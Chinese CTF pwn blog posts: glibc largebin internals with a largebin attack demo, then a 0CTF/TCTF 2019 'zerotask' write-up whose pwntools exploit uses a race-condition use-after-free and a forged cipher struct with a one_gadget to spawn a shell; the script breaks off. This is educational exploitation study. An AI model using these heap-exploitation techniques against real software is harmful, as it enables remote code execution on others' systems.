    <content type="text"><![CDATA[largebin的一些学习记录 基础知识largebin在源码中的定义：（版本2.23）4 #define largebin_index_32(sz) \ (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38) ? 56 + (((unsigned long) (sz)) &gt;&gt; 6) :\ ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ? 91 + (((unsigned long) (sz)) &gt;&gt; 9) :\ ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\ ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\ ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\ 126) #define largebin_index_32_big(sz) \ (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45) ? 49 + (((unsigned long) (sz)) &gt;&gt; 6) :\ ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ? 91 + (((unsigned long) (sz)) &gt;&gt; 9) :\ ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\ ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\ ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\ 126) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \ (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48) ? 48 + (((unsigned long) (sz)) &gt;&gt; 6) :\ ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ? 91 + (((unsigned long) (sz)) &gt;&gt; 9) :\ ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\ ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\ ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\ 126) #define largebin_index(sz) \ (SIZE_SZ == 8 ? largebin_index_64 (sz) \ : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz) \ : largebin_index_32 (sz)) 在largebins中一共包括63个bin，每个bin中的chunk大小不一致，处在一定的区间范围内。并且这63个bin 被分成了6组，每组的bin中的chunk的大小之间的公差一致。 组 数量 公差 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 无限制 每个largebins维护着两个链表，一个是横向的双向链表，它们的chunk size不相同，另一个是纵向的双向链表，它们的chunk size 相同。横向的通过fd_nextsize和bk_nextsize两个指针连接，纵向的通过fd和bk两个指针连接。 在largebin中，chunk按照由大到小的顺序排列。请求一个largebin范围的chunk时，会在对应的bin中从小到大进行扫描，找到第一个合适的。释放一个largebin大小的chunk，首先会根据chunk size的大小，按照bk_nextsize的顺序来选择合适的地方插入，如果碰到相同的chunksize的纵向列表，就会将这个chunk插入到纵向列表，这样就不会进行额外的fd_nextsize和bk_nextsize指针的赋值，否则就会将这个chunk作为独立的纵向列表表头，插入到largebin 中。 请求largebin大小的源码： if (!in_smallbin_range (nb)) { bin = bin_at (av, idx); //如果对应的 bin 为空或者其中的chunk最大的也很小，那就跳过 if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) { // 反向遍历链表，找到第一个比size大的chunk victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ //如果取出的chunk不是bin的最后一个chunk，同时该chunk的纵向列表不为空 //它就会取它前面的那个chunk //因为大小相同的chunk只有一个会被串在nextsize链上 //这可以避免额外的bk_nextsize和fd_nextsize的赋值 if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) victim = victim-&gt;fd; //计算切割后的大小 remainder_size = size - nb; unlink (av, victim, bck, fwd);//通过unlink将chunk从链表移除 /* Exhaust */ if (remainder_size &lt; MINSIZE) { //如果切割后的大小不足以作为一个chunk，那么就会将其标志位设为inuse //同时设置NO_main_arena标志位 set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; } /* Split */ else { //如果剩余的大小可以作为一个chunk //获得剩余部分的地址，放入unsorted bin中 remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) { errstr = &quot;malloc(): corrupted unsorted chunks&quot;; goto errout; } remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range (remainder_size)) { remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); } check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } unlink的源码： #define unlink(AV, P, BK, FD) { \ FD = P-&gt;fd; \ BK = P-&gt;bk; \ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \ else { \ FD-&gt;bk = BK; \ BK-&gt;fd = FD; \ if (!in_smallbin_range (P-&gt;size) \ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) { \ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \ malloc_printerr (check_action, \ &quot;corrupted double-linked list (not small)&quot;, \ P, AV); \ if (FD-&gt;fd_nextsize == NULL) { \ if (P-&gt;fd_nextsize == P) \ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \ else { \ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \ } \ } else { \ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \ } \ } \ } \ } 对largebin的chunk会多了对fd_nextsize和bk_nextsize的检查，原理和fd、bk是一样的 一个小demo：(from 大佬的博客) #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; int main() { unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10; unsigned long *p; p1 = malloc(0x3f0); p2 = malloc(0x20); p3 = malloc(0x400); p4 = malloc(0x20); p5 = malloc(0x400); p6 = malloc(0x20); p7 = malloc(0x120); p8 = malloc(0x20); p9 = malloc(0x140); p10 = malloc(0x20); free(p7); free(p9); p = malloc(0x60); p = malloc(0xb0); free(p1); free(p3); free(p5); p = malloc(0x110); return 0; } 在free掉p7和p9后，会将这两个chunk插入unsorted bin中。 unsortedbin all: 0x602cb0 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x602e10 ◂— 0x602cb0 然后malloc(0x60)会将p7 切割，然后剩余的部分会放在unsorted bin中，而p9会被放到对应的smallbin中 之后free掉三个largebin大小的chunk，这三个chunk都会被放如unsorted bin中 unsortedbin all: 0x602430 —▸ 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x602870 ◂— 0x602430 /* &#39;0$`&#39; */ 之后malloc一个大小为0x110的chunk，使得unsorted bin 中的chunk被放入相应的bin中 largebins 0x400: 0x602870 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) —▸ 0x602430 ◂— 0x602870 /* &#39;p(`&#39; */ 0x602000 PREV_INUSE { prev_size = 0x0, size = 0x401, fd = 0x7ffff7dd1f68 &lt;main_arena+1096&gt;, bk = 0x602870, fd_nextsize = 0x602430, bk_nextsize = 0x602430 } 0x602430 PREV_INUSE { prev_size = 0x0, size = 0x411, fd = 0x602870, bk = 0x7ffff7dd1f68 &lt;main_arena+1096&gt;, fd_nextsize = 0x602000, bk_nextsize = 0x602000 } 0x602870 PREV_INUSE { prev_size = 0x0, size = 0x411, fd = 0x602000, bk = 0x602430, fd_nextsize = 0x0, bk_nextsize = 0x0 } 可以发现largebin中的 chunk按照从大到小的顺序，大的chunk在前面，小的在后面。并且相同大小的chunk构成一条链表，并且0x602870对应的chunk 没有设置bk_nextsize 和 fd_nextszie，它仅通过fd和bk与0x602000和0x602430形成链表。 large bin attack原理往任意地址写堆地址how2heap上的largebin attack 涉及到的libc源码： else { victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } bck = fwd-&gt;bk; 造成的原因：没有对被插入的chunk进行检查 源码： #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; int main() { unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12; unsigned long *p; unsigned long stack[8] = {0}; printf(&quot;stack address: %p\n&quot;, &amp;stack); p1 = malloc(0x3f0); p2 = malloc(0x20); p3 = malloc(0x400); p4 = malloc(0x20); p5 = malloc(0x400); p6 = malloc(0x20); p7 = malloc(0x120); p8 = malloc(0x20); p9 = malloc(0x140); p10 = malloc(0x20); p11 = malloc(0x400); p12 = malloc(0x20); free(p7); free(p9); p = malloc(0x60); p = malloc(0xb0); free(p1); free(p3); free(p5); p = malloc(0x60); free(p11); *(p3-1) = 0x3f1; *(p3) = (unsigned long)(&amp;stack); *(p3+1) = (unsigned long)(&amp;stack); *(p3+2) = (unsigned long)(&amp;stack); *(p3+3) = (unsigned long)(&amp;stack); // trigger malicious malloc p = malloc(0x60); return 0; } 通过某种溢出修改largebin 中的chunk的size，使其变小，小于之前free掉 在unsorted bin中的 large chunk，并且往bk和bk_nextsize字段填入栈地址。那么当再次malloc时，会将p11插入largebin 的头部。经过插入后，会往目标栈地址写入p11的地址。这个可以用来往任意地址写一个不可控的值，类似与unsorted bin attack。 此时p11的内容 pwndbg&gt; chunkinfo 0x6033a0 ================================== Chunk info ================================== Status : Freed Unlinkable : True Result of unlink : FD-&gt;bk (*0x602858) = BK (0x6033a0 -&gt; 0x7fffffffdd10) BK-&gt;fd (*0x7fffffffdd20) = FD (0x6033a0 -&gt; 0x602840) Freeable : false -&gt; Double free chunkaddr(0x6033a0) inused bit is not seted ) prev_size : 0x0 size : 0x410 prev_inused : 1 is_mmap : 0 non_mainarea : 0 fd : 0x602840 bk : 0x7fffffffdd10 fd_nextsize : 0x602840 bk_nextsize : 0x7fffffffdd10 目标栈地址内容： 0x7fffffffdd10: 0x0000000000000000 0x0000000000000000 0x7fffffffdd20: 0x00000000006033a0 0x0000000000000000 0x7fffffffdd30: 0x00000000006033a0 0x0000000000000000 0x7fffffffdd40: 0x0000000000000000 0x0000000000000000 具体实现的操作 victim = p11 //0x6033a0 fwd = p3 //0x602840 操作前的victim pwndbg&gt; x/10gx 0x6033a0 0x6033a0: 0x0000000000000000 0x0000000000000411 0x6033b0: 0x0000000000603290 0x00007ffff7dd1b78 0x6033c0: 0x0000000000000000 0x0000000000000000 0x6033d0: 0x0000000000000000 0x0000000000000000 0x6033e0: 0x0000000000000000 0x0000000000000000 进行下面的操作 else { victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; // 这一步会往stack上写入victim的地址 } bck = fwd-&gt;bk; 操作完后victim的内容 pwndbg&gt; x/10gx victim 0x6033a0: 0x0000000000000000 0x0000000000000411 0x6033b0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x6033c0: 0x0000000000602840 0x00007fffffffdd10 0x6033d0: 0x0000000000000000 0x0000000000000000 0x6033e0: 0x0000000000000000 0x0000000000000000 pwndbg&gt; p victim-&gt;bk_nextsize $24 = (struct malloc_chunk *) 0x7fffffffdd10 pwndbg&gt; p victim-&gt;bk_nextsize-&gt;fd_nextsize $25 = (struct malloc_chunk *) 0x6033a0 pwndbg&gt; x/10gx 0x7fffffffdd10 0x7fffffffdd10: 0x0000000000000000 0x0000000000000000 0x7fffffffdd20: 0x0000000000000000 0x0000000000000000 0x7fffffffdd30: 0x00000000006033a0 0x0000000000000000 0x7fffffffdd40: 0x0000000000000000 0x0000000000000000 0x7fffffffdd50: 0x00007fffffffde40 0xb2b6b91675857a00 伪造large chunk，并分配出来图片来源 ： veritas501大佬博客 通过修改largebin中的chunk的 bk_nextsize字段为伪造的largechunk，使得伪造的largechunk被链入 largebin中，同时伪造的largechunk要能bypass unlink的check 才能被分配出来。 题目LCTF - 2ez4u防护机制☁ 2ez4u [master] ⚡ checksec 2ez4u [*] Checking for new versions of pwntools [*] &#39;/home/zs0zrc/pwn/how2heap/largebin_attack/2ez4u/2ez4u&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 简单运行下，发现是个常规的菜单题。它一共有4个功能，添加、删除、修改、打印 。 程序中存在的一个结构体 apple struct apple { int color; int num; unsigned long value; int index; int size; char description[size]; } 下面分析下程序的具体功能 add功能 unsigned __int64 add() { int i; // [rsp+4h] [rbp-2Ch] int color; // [rsp+8h] [rbp-28h] unsigned int value; // [rsp+Ch] [rbp-24h] unsigned int v4; // [rsp+10h] [rbp-20h] unsigned int size; // [rsp+14h] [rbp-1Ch] apples *apple; // [rsp+18h] [rbp-18h] unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); if ( count == 16 ) { puts(&quot;sorry XD&quot;); } else { printf(&quot;color?(0:red, 1:green):&quot;); color = read_num(); if ( color != 1 &amp;&amp; color ) { puts(&quot;invalid&quot;); } else { printf(&quot;value?(0-999):&quot;); value = read_num(); if ( value &lt;= 999 ) { printf(&quot;num?(0-16):&quot;); v4 = read_num(); if ( v4 &lt;= 0x10 ) { printf(&quot;description length?(1-1024):&quot;); size = read_num(); if ( size &lt;= 0x400 &amp;&amp; size ) { apple = malloc(size + 0x18LL); printf(&quot;description of the apple:&quot;); read_content(apple-&gt;des, size, 10); apple-&gt;color = color; apple-&gt;values = value; apple-&gt;num = v4; for ( i = 0; i &lt;= 15; ++i ) { if ( !*(&amp;array + 4 * i) ) { apple-&gt;index = i; *(&amp;array + 2 * i + 1) = apple; *(&amp;array + 4 * i + 1) = size; *(&amp;array + 4 * i) = 1; ++count; printf(&quot;apple index: %d\n&quot;, i); return __readfsqword(0x28u) ^ v7; } } } else { puts(&quot;???&quot;); } } else { puts(&quot;invalid&quot;); } } else { puts(&quot;invalid&quot;); } } } return __readfsqword(0x28u) ^ v7; } 程序最多添加16个apple，同时apple的size和地址存储在bss段上的一个全局变量数组中。 heapstrom20ctf2018的一道题，质量十分好。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>largebin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0CTF/TCTF2019 PWN 复现]]></title>
    <url>%2F2019%2F03%2F26%2F2019-3-26-0CTFTCTF2019-PWN-%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[很棒，不愧是腾讯搞的比赛，题目质量很高。然而自闭pwn手做自闭了，一个人看真的很容易看自闭。但是每次看到自闭了说不看了，结果过了会又回去看了，真香。这里赛后复现下pwn题。 zerotask防护机制： ☁ zerotask [master] ⚡ checksec task [*] &#39;/home/zs0zrc/game/TCTF2019/pwn/zerotask_pwn/zerotask/task&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 题目一共给了三个文件，一个执行文件，两个动态链接库。 程序一共有三个功能，add_task添加任务，delete_task删除任务，go执行任务 add_task task *add_task() { task *result; // rax int choice; // [rsp+0h] [rbp-10h] int id; // [rsp+4h] [rbp-Ch] task *s; // [rsp+8h] [rbp-8h] printf(&quot;Task id : &quot;, 0LL); id = read_int(); printf(&quot;Encrypt(1) / Decrypt(2): &quot;); choice = read_int(); if ( choice != 1 &amp;&amp; choice != 2 ) return 0xFFFFFFFFLL; s = malloc(0x70uLL); memset(s, 0, 0x70uLL); if ( !sub_11A8(choice, s) ) return 0xFFFFFFFFLL; s-&gt;id = id; s-&gt;next = task_ptr; result = s; task_ptr = s; return result; } signed __int64 __fastcall sub_11A8(int choice, task *buf) { __int64 v3; // rsi __int64 v5; // [rsp+14h] [rbp-1Ch] printf(&quot;Key : &quot;, buf); sub_F82(&amp;buf-&gt;type + 4, 32); printf(&quot;IV : &quot;, 32LL); sub_F82(&amp;buf-&gt;KEY[28], 16); printf(&quot;Data Size : &quot;, 16LL); v5 = read_int(); if ( v5 &lt;= 0 || v5 &gt; 4096 ) return 0LL; buf-&gt;size = v5; buf-&gt;ctx = EVP_CIPHER_CTX_new(); if ( choice == 1 ) { v3 = EVP_aes_256_cbc(); EVP_EncryptInit_ex(buf-&gt;ctx, v3, 0LL, &amp;buf-&gt;type + 4, &amp;buf-&gt;KEY[28]); } else { if ( choice != 2 ) return 0LL; v3 = EVP_aes_256_cbc(); EVP_DecryptInit_ex(buf-&gt;ctx, v3, 0LL, &amp;buf-&gt;type + 4, &amp;buf-&gt;KEY[28]); } LODWORD(buf-&gt;type) = choice; buf-&gt;data = malloc(buf-&gt;size); if ( !buf-&gt;data ) exit(1); printf(&quot;Data : &quot;, v3); sub_F82(buf-&gt;data, buf-&gt;size); return 1LL; } 主要功能是创建task，可以控制分配的明文空间的大小。这里有点坑的是 ida反编译的代码有点问题，就是 id和next字段的偏移会显示错误，看汇编可以看到next是在0x68的位置，但反编译的代码显示在0xd处……同时 sub_11A8函数的参数也会识别错误，需要自己修改下，我上面的是修改后的。 task结构体：(简陋的逆向了一个结构体) 00000000 task struc ; (sizeof=0x70, mappedto_6) 00000000 data dq ? ; offset 00000008 size dq ? 00000010 type dq ? 00000018 KEY db 32 dup(?) 00000038 IV db 16 dup(?) 00000048 padding db 16 dup(?) 00000058 ctx dq ? ; offset 00000060 id dd ? 00000064 field_64 dd ? 00000068 next dq ? ; offset 00000070 task ends delete void delete() { int idx; // [rsp+Ch] [rbp-14h] task *ptr; // [rsp+10h] [rbp-10h] task *v2; // [rsp+18h] [rbp-8h] ptr = task_ptr; v2 = task_ptr; printf(&quot;Task id : &quot;); idx = read_int(); if ( task_ptr &amp;&amp; idx == *(task_ptr + 0x60) ) { task_ptr = *(task_ptr + 0x68); EVP_CIPHER_CTX_free(ptr-&gt;ctx); free(ptr-&gt;data); free(ptr); } else { while ( ptr ) { if ( idx == ptr-&gt;id ) { v2-&gt;next = ptr-&gt;next; EVP_CIPHER_CTX_free(ptr-&gt;ctx); free(ptr-&gt;data); free(ptr); return; } v2 = ptr; ptr = ptr-&gt;next; } } } 将task的chunk释放掉，同时释放 ctx结构体以及申请的data空间。 go unsigned __int64 encrypt() { int v1; // [rsp+4h] [rbp-1Ch] pthread_t newthread; // [rsp+8h] [rbp-18h] task *arg; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(&quot;Task id : &quot;); v1 = read_int(); for ( arg = task_ptr; arg; arg = arg-&gt;next ) { if ( v1 == arg-&gt;id ) { pthread_create(&amp;newthread, 0LL, start_routine, arg); return __readfsqword(0x28u) ^ v4; } } return __readfsqword(0x28u) ^ v4; } void __fastcall __noreturn start_routine(task *buf) { int v1; // [rsp+14h] [rbp-2Ch] __int128 v2; // [rsp+18h] [rbp-28h] __int64 v3; // [rsp+28h] [rbp-18h] __int64 v4; // [rsp+30h] [rbp-10h] unsigned __int64 v5; // [rsp+38h] [rbp-8h] v5 = __readfsqword(0x28u); v2 = buf; v1 = 0; v3 = 0LL; v4 = 0LL; puts(&quot;Prepare...&quot;); sleep(2u); memset(ciphertext, 0, 0x1010uLL); if ( !EVP_CipherUpdate(*(v2 + 0x58), ciphertext, &amp;v1, *v2, *(v2 + 8)) ) pthread_exit(0LL); *(&amp;v2 + 1) += v1; if ( !EVP_CipherFinal_ex(*(v2 + 88), ciphertext + *(&amp;v2 + 1), &amp;v1) ) pthread_exit(0LL); *(&amp;v2 + 1) += v1; puts(&quot;Ciphertext: &quot;); sub_107B(stdout, ciphertext, *(&amp;v2 + 1), 0x10uLL, 1uLL); pthread_exit(0LL); } go功能开启一个线程，根据输入的task_id，执行加密或者解密操作，然后将结果输出。漏洞也出现在这里，因为它开启线程后还sleep(2u)， 很明显的一个条件竞争漏洞…….我当时竟然看不出来，通过这个漏洞可以造成UAF 。 例如： go(1) delete(1) 通过UAF就可以泄露出heap和libc的地址了，不过因为它delete时会将ctx结构体也free掉，如果要泄露的话，delete后要重新创建一个task，不然会报错。 如下： go(1) delete(1) add_task(1) #通过这个就可以泄露地址了 泄露heap地址: def leak_heap(): add_task(1,2,0x90,&#39;d&#39;*0x90) add_task(10,1,0x90,&#39;c&#39;*0x90) add_task(11,1,0x90,&#39;c&#39;*0x90) delete(1) go(10) delete(10) add_task(10,1,0x90,&#39;&#39;) p.recvuntil(&#39;text: \n&#39;) data = p.recvline(&#39;\n&#39;) data = data.replace(&quot; &quot;,&#39;&#39;).strip() plain = mc.decrypt(data) heap_addr=u64(plain[:8]) heap_base = heap_addr - 0x14c0 p.send(&#39;a&#39;*0x90) print hex(heap_base) return heap_base 泄露libc地址： def leak_libc(): add_task(20,1,0x410,&#39;c&#39;*0x410)#因为它是ubuntu18，由tcache,所以分配一个大小超出tcache范围的chunk来泄露libc地址 add_task(5,1,0x20,&#39;c&#39;*0x20) go(20) delete(20) add_task(20,1,0x410,&#39;&#39;) p.recvuntil(&#39;text: \n&#39;) data = p.recvuntil(&#39;\n&#39;) data = data.replace(&quot; &quot;,&#39;&#39;).strip() plain = mc.decrypt(data) leak_libc =u64(plain[:8]) - 0x3ebca0 libc_base = leak_libc libc.address = libc_base p.send(&#39;a&#39;*0x410) print hex(libc_base) return libc_base 地址都泄露出来后，就要考虑怎么控制程序的执行流。这里因为是条件竞争造成的UAF，不能通过这个来构造overlapping chunk。这里通过UAF来劫持EVP_CIPHER_CTX结构体，通过伪造EVP_CIPHER_CTX结构体来劫持程序流。 EVP_CipherUpdate源码： int EVP_CipherUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl, const unsigned char *in, int inl) { if (ctx-&gt;encrypt) return EVP_EncryptUpdate(ctx, out, outl, in, inl); else return EVP_DecryptUpdate(ctx, out, outl, in, inl); } int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl, const unsigned char *in, int inl) { /* Prevent accidental use of decryption context when encrypting */ if (!ctx-&gt;encrypt) { EVPerr(EVP_F_EVP_ENCRYPTUPDATE, EVP_R_INVALID_OPERATION); return 0; } return evp_EncryptDecryptUpdate(ctx, out, outl, in, inl); } static int evp_EncryptDecryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl, const unsigned char *in, int inl) { int i, j, bl; if (ctx-&gt;cipher-&gt;flags &amp; EVP_CIPH_FLAG_CUSTOM_CIPHER) { i = M_do_cipher(ctx, out, in, inl); //要劫持的目标 if (i &lt; 0) return 0; else *outl = i; return 1; } if (inl &lt;= 0) { *outl = 0; return inl == 0; } if (ctx-&gt;buf_len == 0 &amp;&amp; (inl &amp; (ctx-&gt;block_mask)) == 0) { if (M_do_cipher(ctx, out, in, inl)) { *outl = inl; return 1; } else { *outl = 0; return 0; } } i = ctx-&gt;buf_len; bl = ctx-&gt;cipher-&gt;block_size; OPENSSL_assert(bl &lt;= (int)sizeof(ctx-&gt;buf)); if (i != 0) { if (bl - i &gt; inl) { memcpy(&amp;(ctx-&gt;buf[i]), in, inl); ctx-&gt;buf_len += inl; *outl = 0; return 1; } else { j = bl - i; memcpy(&amp;(ctx-&gt;buf[i]), in, j); if (!M_do_cipher(ctx, out, ctx-&gt;buf, bl)) return 0; inl -= j; in += j; out += bl; *outl = bl; } } else *outl = 0; i = inl &amp; (bl - 1); inl -= i; if (inl &gt; 0) { if (!M_do_cipher(ctx, out, in, inl)) return 0; *outl += inl; } if (i != 0) memcpy(ctx-&gt;buf, &amp;(in[inl]), i); ctx-&gt;buf_len = i; return 1; } EVP_CIPHER_CTX结构体： struct evp_cipher_ctx_st { const EVP_CIPHER *cipher; ENGINE *engine; /* functional reference if &#39;cipher&#39; is * ENGINE-provided */ int encrypt; /* encrypt or decrypt */ int buf_len; /* number we have left */ unsigned char oiv[EVP_MAX_IV_LENGTH]; /* original iv */ unsigned char iv[EVP_MAX_IV_LENGTH]; /* working iv */ unsigned char buf[EVP_MAX_BLOCK_LENGTH]; /* saved partial block */ int num; /* used by cfb/ofb/ctr mode */ void *app_data; /* application stuff */ int key_len; /* May change for variable length cipher */ unsigned long flags; /* Various flags */ void *cipher_data; /* per EVP data */ int final_used; int block_mask; unsigned char final[EVP_MAX_BLOCK_LENGTH]; /* possible final block */ } /* EVP_CIPHER_CTX */ ; EVP_CIPHER结构体： struct evp_cipher_st { int nid; int block_size; /* Default value for variable length ciphers */ int key_len; int iv_len; /* Various flags */ unsigned long flags; /* init key */ int (*init) (EVP_CIPHER_CTX *ctx, const unsigned char *key, const unsigned char *iv, int enc); /* encrypt/decrypt data */ int (*do_cipher) (EVP_CIPHER_CTX *ctx, unsigned char *out, const unsigned char *in, size_t inl); /* cleanup ctx */ int (*cleanup) (EVP_CIPHER_CTX *); /* how big ctx-&gt;cipher_data needs to be */ int ctx_size; /* Populate a ASN1_TYPE with parameters */ int (*set_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *); /* Get parameters from a ASN1_TYPE */ int (*get_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *); /* Miscellaneous operations */ int (*ctrl) (EVP_CIPHER_CTX *, int type, int arg, void *ptr); /* Application data */ void *app_data; } /* EVP_CIPHER */ ; 通过查看源码可以发现一条调用链： EVP_CipherUpdate -&gt;EVP_EncryptUpdate-&gt;M_do_cipher 而 M_do_cipher实际上是对cipher+0x20处的函数指针的调用。所以具体利用思路是在堆中写入伪造的fake_cipher 结构体，fake_cipher结构体偏移0x20处填入one_gadget，前面的仿照之前的cipher就可以了。然后利用UAF, 劫持ctx结构体，使其 cipher字段指向伪造的fake_cipher结构体，最后getshell。 其实通过调试也可以发现EVP_CipherUpdate函数中存在一处相对调用，这里call [rax+0x20] ，rax是ctx结构体的cipher结构体的地址，而[rax+0x20] 则是 cipher中的 do_cipher函数指针。 exp: from pwn import* from Crypto.Cipher import AES from binascii import b2a_hex, a2b_hex context.log_level = &quot;debug&quot; #p = process(&#39;./task&#39;) p = remote(&quot;111.186.63.201&quot;,10001) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) class Myencrypt(): def __init__(self,Key,IV): self.Key = Key self.IV = IV self.mode = AES.MODE_CBC def encrypt(self,data): cipher = AES.new(self.Key,self.mode,self.IV) length = 32 len_d = len(data) align = 0 if len_d%length !=0: align = length - len_d%length else: align = 0 data = data + align*&#39;\0&#39; self.enc = cipher.encrypt(data) return b2a_hex(self.enc) def decrypt(self,data): cipher = AES.new(self.Key,self.mode,self.IV) plain = cipher.decrypt(a2b_hex(data)) return plain.strip(&#39;\0&#39;) def add_task(idx,cmd,size,data=&#39;&#39;): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(cmd)) p.sendafter(&quot;:&quot;,&#39;a&#39;*0x20) p.sendafter(&quot;:&quot;,&#39;b&#39;*0x10) p.sendlineafter(&quot;:&quot; , str(size)) p.sendafter(&quot;:&quot;, data) def delete(idx): p.sendlineafter(&quot;Choice: &quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) def go(idx): p.sendlineafter(&quot;Choice: &quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) def leak_heap(): global heap_base add_task(1,2,0x8,&#39;d&#39;*0x8) add_task(2,1,0x8,&#39;c&#39;*0x8) add_task(3,1,0x8,&#39;c&#39;*0x8) delete(1) go(2) delete(2) add_task(2,1,0x8,&#39;&#39;) p.recvuntil(&#39;text: \n&#39;) data = p.recvline(&#39;\n&#39;) data = data.replace(&quot; &quot;,&#39;&#39;).strip() plain = mc.decrypt(data) heap_addr=u64(plain[:8]) heap_base = heap_addr - 0x14c0 p.send(&#39;a&#39;*0x8) print hex(heap_base) return heap_base def leak_libc(): add_task(20,1,0x410,&#39;c&#39;*0x410) add_task(5,1,0x20,&#39;c&#39;*0x20) go(20) delete(20) add_task(20,1,0x410,&#39;&#39;) p.recvuntil(&#39;text: \n&#39;) data = p.recvuntil(&#39;\n&#39;) data = data.replace(&quot; &quot;,&#39;&#39;).strip() plain = mc.decrypt(data) leak_libc =u64(plain[:8]) - 0x3ebca0 libc_base = leak_libc libc.address = libc_base p.send(&#39;a&#39;*0x410) print hex(libc_base) return libc_base def get_shell(): one_gadget = 0x10a38c + libc.address success(hex(one_gadget)) fake_cipher = p64(0x10000001ab) + p64(0x1002) + p64(1) + p64(0) + p64(one_gadget) add_task(0x20,1,0x28,fake_cipher) 